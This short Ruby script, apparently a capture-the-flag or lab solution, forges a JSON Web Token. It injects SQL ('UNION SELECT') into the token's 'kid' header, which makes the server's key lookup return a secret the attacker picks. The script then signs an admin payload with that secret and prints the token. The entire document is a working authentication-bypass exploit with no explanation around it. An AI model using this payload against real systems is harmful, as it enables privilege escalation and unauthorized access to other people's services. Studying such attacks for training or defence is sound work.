# SELECT key FROM keys WHERE kid='[]'
# SELECT key FROM keys WHERE kid='key1'
# SELECT key FROM keys WHERE kid='zzzzzzzzzz' UNION SELECT 'aaa'
# =>aaa
header = '{"typ":"JWT","alg":"HS256","kid":"zzzzzzzzzz\' UNION SELECT \'aaa"}'
payload = '{"user":"admin"}'

require 'base64'
require 'openssl'

data = Base64.strict_encode64(header)+"."+Base64.strict_encode64(payload)
data.gsub!("=","")

secret = "aaa"

signature = Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), secret, data))

puts data+"."+signature
